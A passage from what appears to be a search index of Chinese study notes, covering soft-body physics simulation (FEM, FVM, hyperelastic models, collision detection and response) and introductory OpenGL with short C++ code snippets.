W}{\\partial \\varepsilon_{uu}} \\frac{\\partial \\varepsilon_{uu}}{ \\partial x_i} + \\frac{\\partial W}{\\partial \\varepsilon_{vv}} \\frac{\\partial \\varepsilon_{vv}}{ \\partial x_i} + \\frac{\\partial W}{\\partial \\varepsilon_{uv}} \\frac{\\partial \\varepsilon_{uv}}{ \\partial x_i}\\right)^T \\] Force 1Force 2 <p></p> <p></p> <p>\u603b\u4e4b\uff0c\u6700\u540e\u7684\u7ed3\u8bba\u662f\uff1a</p> \\[ [f_1, f_2] = -A^{ref} FS[X_{10}, X_{20}]^{-T},\\ f_0 = -f_1 - f_2 \\] <p>\u6700\u540e\u6839\u636e\u529b\u4f7f\u7528\u663e\u5f0f\u79ef\u5206\u6216\u9690\u5f0f\u79ef\u5206\u8fdb\u884c\u66f4\u65b0\u3002</p>"},{"location":"Accumulation/Games103/Soft%20Body/#finite-volume-method-fvm","title":"Finite Volume Method (FVM)","text":"<p>\u76f8\u6bd4\u4e8e FEM \u7528\u80fd\u91cf\u5bf9\u4f4d\u7f6e\u6c42\u5bfc\u8ba1\u7b97\u529b\uff0cFVM \u5bf9 Traction Vector \u79ef\u5206\u5f97\u5230\u529b\u3002</p> <ul> <li>\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\uff0cTraction Vector \u8868\u793a\u5355\u4f4d\u957f\u5ea6\u53d7\u5230\u7684\u529b \\(T= \\frac{dF}{dl}\\)</li> <li>\u5728\u4e09\u7ef4\u7a7a\u95f4\u4e2d\uff0cTraction Vector \u8868\u793a\u5355\u4f4d\u9762\u79ef\u53d7\u5230\u7684\u529b \\(T= \\frac{dF}{dA}\\)</li> </ul> <p>\u5728\u4e0d\u540c\u7684\u72b6\u6001\u3001\u4e0d\u540c\u7684\u9700\u6c42\u4e0b\uff0c\u6211\u4eec\u5b9a\u4e49\u4e09\u79cd\u4e0d\u540c\u7684 Stress\uff1a</p> <p></p> <p>\u5176\u4e2d Second Piola-Kirchhoff Stress \u662f\u4e0a\u4e00\u5c0f\u8282 FEM \u7528\u7684\uff0c\u800c Cauchy Stress \u662f\u672c\u8282 FVM \u9700\u8981\u7528\u5230\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u8ba1\u7b97\u5f62\u53d8\u540e\u7684\u6cd5\u7ebf\u53d8\u6210\u5f62\u53d8\u540e\u7684\u529b\u3002</p> <p>\\(F\\) \u6307\u7684\u662f\u4e0a\u4e00\u8282\u5b9a\u4e49\u8fc7\u7684 Deformation Gradient \u5f62\u53d8\u68af\u5ea6</p> <p>\u5176\u4e2d \\(D_m\\) \u5728\u521d\u59cb\u5316\u4e2d\u8fdb\u884c\u8bbe\u7f6e\uff0c\u8868\u793a\u56db\u9762\u4f53\u539f\u672c\u7684\u5f62\u72b6\u3002\\(F\\) \u5728\u6bcf\u4e00\u5e27\u7684\u66f4\u65b0\u4e2d\u8ba1\u7b97\uff0c\u8868\u793a\u56db\u8fb9\u5f62\u7684\u5f62\u53d8\u68af\u5ea6\u3002</p> <p></p> <p>\u5f97\u5230\u5f62\u53d8\u540e\u56db\u9762\u4f53\u56db\u4e2a\u9876\u70b9\u53d7\u5230\u7684\u529b\u540e\uff0c\u518d\u7528\u79ef\u5206\u6cd5\u66f4\u65b0\u901f\u5ea6\u548c\u4f4d\u7f6e\u5b8c\u6210\u6a21\u62df\u5373\u53ef\uff1a</p> <pre><code>for(int i=0; i&lt;number; i++)\n{\n    //Update X and V here\n    V[i] += Force[i] * dt / mass;\n    V[i] *= damp;\n\n    // Laplacian smoothing\n    V[i] = (V_num[i] * V[i] + V_sum[i]) / (2 * V_num[i]);\n\n    X[i] += V[i] * dt;\n\n    //Some Collision Handling here\n    [...]\n}\n</code></pre> <p>\u5f53\u5212\u5206\u7684\u5355\u5143\u4e3a\u4e09\u89d2\u5f62\u6216\u56db\u9762\u4f53\u65f6\uff0cFEM \u548c FVM \u7b49\u6548</p>"},{"location":"Accumulation/Games103/Soft%20Body/#hyperelastic-models","title":"Hyperelastic Models","text":"<p>\u5728 FEM \u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 Saint Venant-Kirchhoff Model, StVK \u6765\u4f5c\u4e3a\u80fd\u91cf\u5bc6\u5ea6\u6a21\u578b\u3002\u672c\u8282\u518d\u4ecb\u7ecd\u51e0\u79cd\u4e0d\u540c\u7684\u6a21\u578b\u3002</p> <p>\u5bf9\u4e8e\u5404\u5411\u540c\u6027\u6750\u6599\uff0c\u6211\u4eec\u8ba4\u4e3a\u5176 First Piola-Kirchhoff Stress \u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> \\[ P=P(F)= P(UDV^T) =UP(\\lambda_0, \\lambda_1, \\lambda_2) V^T \\] <p>\u5176\u4e2d \\(\\lambda\\) \u4e3a\u5f62\u53d8\u8fc7\u7a0b\u4e2d\u5404\u4e2a\u7ef4\u5ea6\u7684\u7f29\u653e\u7cfb\u6570\uff0c\u5373\u7f29\u653e\u77e9\u9635 \\(D\\) \u7684\u5bf9\u89d2\u7ebf\u5143\u7d20\u3002</p> <p>\u8bb0 \\(C=D^TD\\) \u4e3a\u67ef\u897f-\u683c\u6797\u53d8\u5f62\u5f20\u91cf\uff0c\u4e14\u6709\uff1a</p> \\[\\begin{array}l I_C &amp; = trace(C) = \\lambda_0^2 + \\lambda_1^2 + \\lambda_2^2 \\\\ II_C &amp; = det(C^2) = \\lambda_0^4 + \\lambda_1^4 + \\lambda_2^4 \\\\ III_C &amp; = \\frac{1}{2}(trace^2(C) -trace(C^2))= \\lambda_0^2 \\lambda_1^2 + \\lambda_1^2 \\lambda_2^2 + \\lambda_0^2 \\lambda_2^2  \\end{array} \\] <p>\u5728\u6b64\u524d\u63d0\u4e0b\uff0c\u56db\u79cd\u4e0d\u540c\u7684\u5f39\u6027\u6a21\u578b\u7684\u80fd\u91cf\u5bc6\u5ea6 \\(W\\) \u53ef\u8bb0\u4e3a\uff1a</p> <p></p> <p>StVK \u7f3a\u70b9</p> <p></p> <p>\u5f62\u53d8\u4e3a 1 \u65f6\u8bb0\u4e3a\u539f\u957f\u3002StVK \u6a21\u578b\u5728\u538b\u7f29\u65f6 Stress \u53cd\u5347\uff0c\u6700\u7ec8\u4f1a\u5bfc\u81f4\u7269\u4f53\u5f62\u53d8\u4e0d\u80fd\u6062\u590d\uff1b\u800c Neo Hookean \u5219\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898</p>"},{"location":"Accumulation/Games103/Soft%20Body/#collision-handling","title":"Collision Handling","text":""},{"location":"Accumulation/Games103/Soft%20Body/#collision-detection","title":"Collision Detection","text":"<p>\u78b0\u649e\u68c0\u6d4b\u4e00\u822c\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff0c\u7b2c\u4e00\u6b65\u5148\u7528 Spatial Hashing \u6216 BVH \u6392\u9664\u6389\u5927\u90e8\u5206\u4e0d\u53ef\u80fd\u53d1\u751f\u78b0\u649e\u7684\u4e09\u89d2\u5f62\u5bf9\uff1b\u7b2c\u4e8c\u6b65\u518d\u5728\u5c40\u90e8\u7528 DCD \u6216 CCD \u8fdb\u884c\u78b0\u649e\u68c0\u6d4b\u3002</p> <p></p> <p>Spatial Hashing</p> <p>Spatial Hashing \u53c8\u88ab\u79f0\u4e3a Spatial Partition\uff0c\u5b83\u5c06\u7a7a\u95f4\u5212\u5206\u4e3a\u4e00\u4e2a\u4e2a bucket\uff0c\u5982\u679c\u4e09\u89d2\u5f62\u4e0e\u67d0 bucket \u76f8\u4ea4\uff0c\u5219\u7ef4\u62a4\u4e00\u4e2a\u8be5 bucket \u5230\u8be5\u4e09\u89d2\u5f62\u5bf9\u8c61\u7684\u6307\u5411\u3002</p> <p></p> <p>\u5f53\u68c0\u6d4b\u78b0\u649e\u65f6\uff0c\u53ea\u9700\u8981\u770b\u540c\u4e00\u4e2a bucket \u6709\u591a\u4e2a\u5bf9\u8c61\u7684\u533a\u57df\u5373\u53ef\u3002</p> <p>\u4f46\u662f\u76f4\u63a5\u5b58\u50a8\u6240\u6709 bucket \u9700\u8981\u5360\u636e\u5927\u91cf\u5185\u5b58\uff0c\u6211\u4eec\u4e0d\u518d\u7ef4\u62a4\u7a7a\u683c\u5b50\uff0c\u800c\u662f\u7ef4\u62a4\u975e\u7a7a\u7684\u952e\u503c\u5bf9\u94fe\u8868\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u683c\u5b50\u7684 ID\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u6307\u5411\u4e09\u89d2\u5f62\u5bf9\u8c61\u3002</p> <p>\u53ef\u4ee5\u7c7b\u6bd4\u6210 List \u8f6c\u6210 Linked List</p> <p>\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u4f7f\u7528\u7c7b\u4f3c\u4e0a\u56fe\u7684 Grid Order \u5f62\u5f0f\uff0c\u5728\u6211\u4eec\u904d\u5386\u94fe\u8868\u7684\u65f6\u5019\u4e0d\u80fd\u5f88\u597d\u7684\u8bbf\u95ee\u5468\u8fb9\u683c\u5b50\uff0cCache \u547d\u4e2d\u7387\u8f83\u4f4e\uff0c\u5373\u7f3a\u5c11 Locality \u7279\u6027\u3002\u53ef\u4ee5\u91c7\u7528 Morton Code \u4f5c\u4e3a\u7f16\u53f7\u65b9\u5f0f\uff1a</p> <p></p> <p>Spatial Hashing \u7684\u4f18\u70b9\u662f\u5bb9\u6613\u6267\u884c\u3001\u5bf9 GPU \u53cb\u597d\uff1b\u7f3a\u70b9\u662f\u6bcf\u6b21\u7269\u4f53\u66f4\u65b0\u90fd\u8981\u91cd\u65b0\u8ba1\u7b97\u3002</p> <p>Bounding Volumn Hierarchy</p> <p>\u6309\u7167\u5bf9\u8c61\u7684\u90bb\u8fd1\u6027\uff0c\u6211\u4eec\u6784\u9020\u6709\u5c42\u6b21\u7684\u5305\u56f4\u76d2\uff1a</p> <p></p> <p>\u78b0\u649e\u68c0\u6d4b\u65f6\uff0c\u4ece\u4e0a\u5230\u4e0b\u8fdb\u884c\u5224\u65ad\u662f\u5426\u76f8\u4ea4\uff0c\u5982\u679c\u5927\u5305\u56f4\u76d2\u90fd\u6ca1\u6709\u76f8\u4ea4\uff0c\u90a3\u4e48\u4e5f\u5c31\u4e0d\u9700\u8981\u5224\u65ad\u5c0f\u5305\u56f4\u76d2\u4e86\u3002</p> <p>\u6211\u4eec\u4e00\u822c\u91c7\u7528 Axis-aligned \u7684\u5305\u56f4\u76d2\uff0c\u5373\u4e0e\u5750\u6807\u8f74\u5bf9\u9f50\uff0c\u8fd9\u6837\u5224\u65ad\u662f\u5426\u76f8\u4ea4\u53ea\u9700\u8981\u6839\u636e\u5750\u6807\u4e4b\u95f4\u7684\u5173\u7cfb\u6bd4\u5bf9\u5373\u53ef\u3002</p> <p>\u5305\u56f4\u76d2\u7684\u5c40\u9650\u6027\u5728\u4e8e\uff0c\u5bf9\u4e8e\u5468\u906d\u7684\u4e09\u89d2\u5f62\u5f88\u96be\u5254\u9664\uff1b\u5e76\u4e14\u5bf9\u4e8e\u5927\u5f62\u53d8\u7269\u4f53\u7684\u6a21\u62df\uff0c\u5982\u8863\u670d\uff0c\u8f83\u96be\u5e94\u7528\u3002</p> <p>Discrete Collision Detection</p> <p>DCD \u5728\u79bb\u6563\u7684\u65f6\u95f4 \\(x^{[0]}\\) \u548c \\(x^{[1]}\\) \u4e2d\u68c0\u6d4b\u7269\u4f53\u662f\u5426\u76f8\u4ea4\u3002\u5bf9\u4e8e\u4e00\u6761\u5df2\u77e5\u7684 edge \\(&lt;x_a, x_b&gt;\\)\uff0c\u6211\u4eec\u9700\u8981\u68c0\u6d4b\u5176\u662f\u5426\u4e0e\u4e09\u89d2\u5f62 \\(x_1 x_2 x_3\\) \u76f8\u4ea4\uff0c\u8ba1\u7b97\u6b65\u9aa4\u5982\u4e0b\uff1a</p> \\[\\begin{array}l ((1-t)x_a + tx_b - x_0)\\cdot (x_{10} \\times x_{20}) = 0 \\\\ \\Rightarrow t =\\frac{x_{0a}\\cdot (x_{10} \\times x_{20})}{x_{ba}\\cdot (x_{10} \\times x_{20})} \\end{array}\\] <p>\u5982\u679c \\(t\\in [0,1]\\)\uff0c\u5219\u53ef\u5224\u65ad\u8be5 edge \u4e0e\u4e09\u89d2\u5f62\u76f8\u4ea4\u3002</p> <p>\u5bf9\u4e8e\u8fd0\u52a8\u6bd4\u8f83\u5feb\u7684\u7269\u4f53\uff0c\u6709\u53ef\u80fd\u5b58\u5728\u524d\u540e\u4e24\u4e2a\u79bb\u6563\u65f6\u95f4\u72b6\u6001\u90fd\u6ca1\u6709\u76f8\u4ea4\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5e94\u8be5\u76f8\u649e\u4e86\u7684\u60c5\u51b5\u3002</p> <p>Continuous Collision Detection</p> <p>CCD \u68c0\u6d4b \\(x^{[0]}\\) \u5230 \\(x^{[1]}\\) \u72b6\u6001\u4e4b\u95f4\uff0c\u662f\u5426\u53d1\u751f\u76f8\u4ea4\u3002\u5728 CCD \u4e2d\uff0c\u6211\u4eec\u8ba4\u4e3a\u6bcf\u4e2a\u70b9\u5728\u4e24\u4e2a\u65f6\u95f4\u4e4b\u95f4\u7684\u901f\u5ea6\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\uff0c\u90a3\u4e48\u4e24\u4e2a\u72b6\u6001\u4e4b\u95f4\u7684\u4f4d\u7f6e\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a \\(x(t)\\) \u4e00\u6b21\u7ebf\u6027\u51fd\u6570\u3002</p> <p>\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\u76f8\u4ea4\uff1a</p> Vertex-Triangle TestEdge-Edge Test <p></p> <p></p> <p>\u4e09\u6b21\u65b9\u7a0b\u5c3d\u91cf\u7528\u725b\u987f\u6cd5\u6216\u4e8c\u5206\u6cd5\u89e3\uff0c\u5982\u679c\u7528\u6c42\u6839\u516c\u5f0f\uff0c\u4e09\u6b21\u65b9\u6839\u7684\u8bef\u5dee\u975e\u5e38\u5927</p> <p>\u76f8\u6bd4\u4e8e DCD\uff0c\u5f00\u9500\u66f4\u5927\u3001\u66f4\u96be\u5b9e\u73b0\u3002</p>"},{"location":"Accumulation/Games103/Soft%20Body/#collision-response-approaches","title":"Collision Response Approaches","text":"<p>\u7ed9\u5b9a\u4e24\u4e2a\u72b6\u6001 \\(x^{[0]}\\) \u548c \\(x^{[1]}\\)\uff0c\u6211\u4eec\u60f3\u8981\u627e\u5230\u4e00\u4e2a\u79bb \\(x^{[1]}\\) \u8f83\u8fd1\u7684 \\(\\bar{x}^{[1]}\\) \uff0c\u4f7f\u5f97 \\(x^{[0]} \\bar{x}^{[1]}\\) \u6ca1\u6709\u53d1\u751f\u76f8\u4ea4\uff08\u5373\u6ca1\u6709\u78b0\u649e\uff09\u3002 \u6b64\u65f6\u6709 Interior Point Methods \u548c Impact Zone Optimization \u4e24\u79cd\u7b56\u7565\uff1a</p> <p></p> <ul> <li>Interior Point Methods\uff1a \u7ec6\u5316\u6a21\u62df\u7684\u6b65\u957f\uff0c\u63d0\u9ad8\u6a21\u62df\u7684\u771f\u5b9e\u6027\uff0c\u5c3d\u91cf\u4fdd\u8bc1\u6bcf\u4e00\u6b65\u90fd\u843d\u5728\u5408\u6cd5\u8303\u56f4\u5185\u3002<ul> <li>\u5185\u70b9\u6cd5\u4fdd\u8bc1\u6c38\u8fdc\u80fd\u6a21\u62df\u5230\u8fd8\u7b97\u5408\u7406\u7684\u7ed3\u679c\uff0c\u4f46\u53ef\u80fd\u8981\u8d70\u5f88\u591a\u6b65\u624d\u80fd\u8fbe\u5230\u8fb9\u754c\u4f4d\u7f6e\u3002</li> <li>\u7531\u4e8e\u7269\u4f53\u4e0a\u6240\u6709\u70b9\u7684\u6a21\u62df\u9700\u8981\u540c\u6b65\u8fdb\u884c\uff0c\u4e0d\u4ec5\u53d1\u751f\u78b0\u649e\u7684\u70b9\u9700\u8981\u8d70\u8fd9\u4e48\u591a\u6b65\uff0c\u5176\u4ed6\u7269\u4f53\u4e0a\u6240\u6709\u7684\u70b9\u90fd\u9700\u8981\u8ddf\u7740\u8d70\u5f88\u591a\u6b65\uff0c\u6240\u4ee5\u5185\u70b9\u6cd5\u8fd0\u884c\u901f\u5ea6\u6bd4\u8f83\u6162\u3002</li> </ul> </li> <li>Impact Zone Optimization\uff1a \u4ece\u53d1\u751f\u78b0\u649e\u7684\u4f4d\u7f6e\u51fa\u53d1\u56de\u5230\u5408\u6cd5\u4f4d\u7f6e<ul> <li>\u53ea\u9700\u8981\u5904\u7406\u53d1\u751f\u78b0\u649e\u7684\u90a3\u4e9b\u9876\u70b9\uff0c\u4e14\u6a21\u62df\u7684\u6b65\u957f\u53ef\u4ee5\u8bbe\u5f97\u6bd4\u8f83\u5927\uff0c\u8fd0\u884c\u901f\u5ea6\u8f83\u5feb\u3002</li> <li>\u4f46\u662f\u53ef\u80fd\u5b58\u5728\u56de\u4e0d\u5230\u5408\u6cd5\u533a\u57df\u7684\u60c5\u51b5\uff0c\u5c24\u5176\u662f\u5f53\u6a21\u62df\u6b65\u957f\u8f83\u5927\uff0c\u5bfc\u81f4\u78b0\u649e\u4f4d\u7f6e\u79bb\u5b89\u5168\u533a\u57df\u8f83\u8fdc\u7684\u65f6\u5019\u3002</li> </ul> </li> </ul> <p>Log-Barrier \u5185\u70b9\u6cd5\u8bbe\u7f6e\u80fd\u91cf\u4e3a\u8ddd\u79bb\u7684 log\uff0c\u6765\u6c42\u89e3\u78b0\u649e\u6700\u7ec8\u7684\u5408\u6cd5\u4f4d\u7f6e\uff1a</p> <p></p> <p>\u6700\u540e\u53d8\u6210\u4e00\u4e2a\u4f18\u5316\u95ee\u9898\u3002\uff08\u6446\u4e86\uff09</p>"},{"location":"Accumulation/LearnOpenGL/","title":"Index","text":"<p> \u7ea6 42 \u4e2a\u5b57  31 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u5bf9\u4e8e\u4e00\u4e2a OpenGL \u9879\u76ee\uff0c\u9700\u8981\u4fee\u6539\u7684\u662f VC++-&gt;\u5305\u542b\u76ee\u5f55\u3001 VC++-&gt;\u5e93\u76ee\u5f55\u3001\u94fe\u63a5\u5668-&gt;\u8f93\u5165-&gt;\u9644\u52a0\u4f9d\u8d56\u9879\uff0c\u4ee5\u53ca\u5c06 <code>glad.c</code> \u6dfb\u52a0\u8fdb\u6e90\u6587\u4ef6\u3002</p> <pre><code>// \u5904\u7406\u8f93\u5165\nvoid processInput(GLFWwindow* window)\n{\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS) // \u6309\u4e0b ESC \u952e\n        glfwSetWindowShouldClose(window, true);            // \u8bbe\u7f6e\u7a97\u53e3\u5173\u95ed\n\n    if (glfwGetKey(window, GLFW_KEY_UP) == GLFW_PRESS)\n    {\n        yoffset += 0.001f;\n        if (yoffset &gt;= 1.0f)\n            yoffset = 1.0f;\n    }\n    if (glfwGetKey(window, GLFW_KEY_DOWN) == GLFW_PRESS)\n    {\n        yoffset -= 0.001f;\n        if (yoffset &lt;= -1.0f)\n            yoffset = -1.0f;\n    }\n    if (glfwGetKey(window, GLFW_KEY_LEFT) == GLFW_PRESS)\n    {\n        xoffset -= 0.001f;\n        if (xoffset &lt;= -1.0f)\n            xoffset = -1.0f;\n    }\n    if (glfwGetKey(window, GLFW_KEY_RIGHT) == GLFW_PRESS)\n    {\n        xoffset += 0.001f;\n        if (xoffset &gt;= 1.0f)\n            xoffset = 1.0f;\n    }\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/","title":"1. \u5165\u95e8","text":""},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#1","title":"1. \u5165\u95e8","text":"<p> \u7ea6 6911 \u4e2a\u5b57  862 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 45 \u5206\u949f</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#opengl","title":"OpenGL","text":"<p>OpenGL \u4e00\u822c\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u56fe\u5f62API(Application Programming Interface)\uff0c\u5b83\u5305\u542b\u4e00\u7cfb\u5217\u53ef\u4ee5\u64cd\u4f5c\u56fe\u5f62\u3001\u56fe\u50cf\u7684\u51fd\u6570\u3002\u7136\u800c OpenGL \u672c\u8eab\u5e76\u4e0d\u662f\u4e00\u4e2a API\uff0c\u5b83\u4ec5\u4ec5\u662f\u7531Khronos\u7ec4\u7ec7\u5236\u5b9a\u5e76\u7ef4\u62a4\u7684\u89c4\u8303(Specification)\uff0c\u5176\u89c4\u5b9a\u4e86\u6bcf\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u548c\u7ed3\u679c\uff0c\u800c\u5185\u90e8\u5177\u4f53\u7684\u5b9e\u73b0\u7ec6\u8282\uff0c\u5c06\u7531 OpenGL \u5e93\u7684\u5f00\u53d1\u8005\u81ea\u884c\u51b3\u5b9a\u3002</p> <p>OpenGL \u5e93\u7684\u5f00\u53d1\u8005\u4e00\u822c\u662f\u663e\u5361\u5382\u5546\uff0c\u4f60\u7684\u663e\u5361\u652f\u6301\u7684OpenGL\u7248\u672c\u90fd\u662f\u4e13\u95e8\u4e3a\u8fd9\u4e2a\u7cfb\u5217\u663e\u5361\u5f00\u53d1\u7684</p> <p>\u65e9\u671f\u7684 OpenGL \u4f7f\u7528\u7acb\u5373\u6e32\u67d3\u6a21\u5f0f\uff08Immediate mode\uff0c\u56fa\u5b9a\u6e32\u67d3\u7ba1\u7ebf\uff09\uff0c\u8fd9\u4e2a\u6a21\u5f0f\u5bb9\u6613\u7406\u89e3\u548c\u4f7f\u7528\uff0c\u4f46\u662fOpenGL\u7684\u5927\u591a\u6570\u529f\u80fd\u90fd\u88ab\u5e93\u9690\u85cf\u8d77\u6765\uff0c\u5f00\u53d1\u8005\u5f88\u5c11\u6709\u63a7\u5236OpenGL\u5982\u4f55\u8fdb\u884c\u8ba1\u7b97\u7684\u81ea\u7531\uff0c\u5bfc\u81f4\u7075\u6d3b\u6027\u548c\u6548\u7387\u592a\u4f4e\u3002\u56e0\u6b64\u4eceOpenGL3.2\u5f00\u59cb\uff0c\u89c4\u8303\u6587\u6863\u5f00\u59cb\u5e9f\u5f03\u7acb\u5373\u6e32\u67d3\u6a21\u5f0f\uff0c\u5e76\u9f13\u52b1\u5f00\u53d1\u8005\u5728 OpenGL \u7684\u6838\u5fc3\u6a21\u5f0f\uff08Core-profile\uff09\u4e0b\u8fdb\u884c\u5f00\u53d1\uff0c\u8fd9\u4e2a\u5206\u652f\u7684\u89c4\u8303\u5b8c\u5168\u79fb\u9664\u4e86\u65e7\u7684\u7279\u6027\u3002</p> <p>\u5728 OpenGL \u7684\u6838\u5fc3\u6a21\u5f0f\u4e0b\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u4f7f\u7528\u4e00\u4e2a\u5df2\u5e9f\u5f03\u7684\u51fd\u6570\u65f6\uff0cOpenGL \u4f1a\u62a5\u9519\u5e76\u4e2d\u6b62\u7ed8\u56fe\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5fc5\u987b\u4f7f\u7528\u66f4\u73b0\u4ee3\u7684\u51fd\u6570\u3002\u73b0\u4ee3\u51fd\u6570\u7684\u4f18\u52bf\u662f\u66f4\u9ad8\u7684\u7075\u6d3b\u6027\u548c\u6548\u7387\uff0c\u4f7f\u7528\u8005\u9700\u8981\u771f\u6b63\u7406\u89e3 OpenGL \u548c\u56fe\u5f62\u7f16\u7a0b\u3002</p> <p>LearnOpenGL \u6587\u6863\u9762\u5411 OpenGL3.3 \u7684\u6838\u5fc3\u6a21\u5f0f</p> <p>OpenGL \u672c\u8eab\u7c7b\u4f3c\u4e00\u4e2a\u5de8\u5927\u7684\u72b6\u6001\u673a\uff0c\u4e00\u7cfb\u5217\u53d8\u91cf\u63cf\u8ff0 OpenGL \u6b64\u523b\u5e94\u5982\u4f55\u8fd0\u884c\u3002OpenGL \u7684\u72b6\u6001\u901a\u5e38\u88ab\u79f0\u4e3a\u4e0a\u4e0b\u6587\uff08Context\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u9009\u9879\u3001\u64cd\u4f5c\u7f13\u51b2\u7b49\u64cd\u4f5c\u66f4\u6539 OpenGL \u7684\u72b6\u6001\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_1","title":"\u7ed8\u5236\u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\uff01","text":"<p>\u60f3\u8981\u753b\u51fa\u6211\u4eec\u60f3\u8981\u7684\u56fe\u5f62\u6548\u679c\uff0c\u9996\u5148\u8981\u505a\u7684\u662f\u521b\u5efa\u4e00\u4e2a OpenGL \u7684\u4e0a\u4e0b\u6587\u548c\u4e00\u4e2a\u7528\u4e8e\u663e\u793a\u7684\u7a97\u53e3\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 GLUT\u3001SDL\u3001SFML\u548cGLFW \u7b49\u5e93\u6765\u63d0\u4f9b\u4e00\u4e2a\u7a97\u53e3\u548c\u4e0a\u4e0b\u6587\uff0c\u8282\u7701\u6211\u4eec\u5199\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u4ee3\u7801\u7684\u65f6\u95f4\u3002\u5728\u6559\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 GLFW \u4f5c\u4e3a\u6f14\u793a\u3002</p> <p>GLFW \u5e93\u662f\u4e00\u4e2a\u4e13\u95e8\u9488\u5bf9 OpenGL \u7684C\u8bed\u8a00\u5e93\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u6e32\u67d3\u7269\u4f53\u6240\u9700\u7684\u6700\u4f4e\u9650\u5ea6\u7684\u63a5\u53e3\uff0c\u5141\u8bb8\u7528\u6237\u521b\u5efa\u4e0a\u4e0b\u6587\u4ee5\u53ca\u7b80\u5355\u7a97\u53e3\u3002</p> <p>TBD</p> <p>OpenGL \u7684\u5927\u90e8\u5206\u5de5\u4f5c\u662f\u5c063D\u5750\u6807\u8f6c\u6362\u4e3a\u9002\u5e94\u4f60\u5c4f\u5e55\u76842D\u5750\u6807\uff0c\u8fd9\u4e00\u5904\u7406\u8fc7\u7a0b\u7531 OpenGL \u7684\u56fe\u5f62\u6e32\u67d3\u7ba1\u7ebf\u7ba1\u7406\uff1a</p> <ul> <li>&lt;1&gt; \u5c06 3D \u5750\u6807\u8f6c\u6362\u4e3a 2D \u5750\u6807</li> <li>&lt;2&gt; \u5c06 2D \u5750\u6807\u8f6c\u53d8\u4e3a\u6709\u989c\u8272\u7684\u50cf\u7d20</li> </ul> <p>Shader \u7740\u8272\u5668</p> <p>\u56fe\u5f62\u6e32\u67d3\u7ba1\u7ebf\u4ece 3D \u5750\u6807\u5230\u50cf\u7d20\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u53ef\u4ee5\u5212\u5206\u4e3a\u591a\u4e2a\u53ef\u5e76\u884c\u6267\u884c\u7684\u9636\u6bb5\uff0c\u56e0\u6b64\u5bf9\u4e8e\u663e\u5361\u4e2d\u4e0a\u5343\u4e07\u7684\u5c0f\u5904\u7406\u6838\u5fc3\uff0c\u5b83\u4eec\u5728 GPU \u4e0a\u4e3a\u6bcf\u4e00\u4e2a\u6e32\u67d3\u7ba1\u7ebf\u9636\u6bb5\u8fd0\u884c\u5404\u81ea\u7684\u7740\u8272\u5668\uff0c\u4ece\u800c\u5feb\u901f\u5904\u7406\u6570\u636e\u3002</p> <p>\u5f00\u53d1\u8005\u53ef\u4ee5\u7528\u81ea\u5df1\u5199\u7684\u7740\u8272\u5668\u4ee3\u66ff\u663e\u5361\u4e0a\u9ed8\u8ba4\u7684\u7740\u8272\u5668\uff0c\u5b83\u4eec\u8fd0\u884c\u5728 GPU \u4e0a\uff0c\u56e0\u6b64\u53ef\u4ee5\u8282\u7701\u5b9d\u8d35\u7684 CPU \u65f6\u95f4\u3002</p> <pre><code>graph TD\n    A[Vertex Shader] --&gt;|Process Vertex Attributes\\nTransform 3D Coordinates| B[Geometry Shader]\n    B --&gt;|Generate New Primitives or Shapes| C[Primitive Assembly]\n    C --&gt;|Assemble Primitive Shapes| D[Rasterization Stage]\n    D --&gt;|Generate Fragments\\nPerform Clipping| E[Fragment Shader]\n    E --&gt;|Compute Pixel Colors| F[Alpha Testing and Blending]\n    F --&gt;|Determine Final Color\\nHandle Transparency| G[Final Image]</code></pre> <p>\u5bf9\u4e8e\u4e00\u4e2a\u4e09\u89d2\u5f62\uff0c\u6211\u4eec\u9700\u8981\u6307\u5b9a\u5176\u4e09\u4e2a 3D \u9876\u70b9\uff0c\u5176\u6807\u51c6\u5316\u8bbe\u5907\u5750\u6807(Normalized Device Coordinates)\u5f62\u5f0f\u7684\u9876\u70b9\u6570\u7ec4\u53ef\u4ee5\u5b9a\u4e49\u4e3a\uff1a</p> <pre><code>float vertices[] =\n{\n-0.5f, -0.5f, 0.0f,\n 0.5f, -0.5f, 0.0f,\n 0.0f,  0.5f, 0.0f\n};\n</code></pre> <p>Normalized Device Coordinates, NDC</p> <p>x\u3001y\u3001z\u8f74\u5750\u6807\u90fd\u4f4d\u4e8e <code>[-1.0,1.0]</code> \u8303\u56f4\u5185\u3002\u901a\u8fc7\u51fd\u6570 <code>glViewport</code> 